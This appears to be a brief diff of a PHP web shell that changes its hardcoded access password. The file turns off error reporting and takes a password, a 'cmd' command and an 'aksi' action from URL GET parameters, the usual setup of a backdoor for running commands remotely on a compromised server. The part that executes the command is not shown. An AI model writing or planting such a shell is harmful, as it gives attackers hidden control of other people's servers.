@@ -2,7 +2,7 @@
 
 error_reporting(0);
 
-$password = "12345p455word";
+$password = "p455w0rd123";
 $get_password = $_GET["password"];
 $cmd = $_GET["cmd"];
 $aksi = $_GET["aksi"];
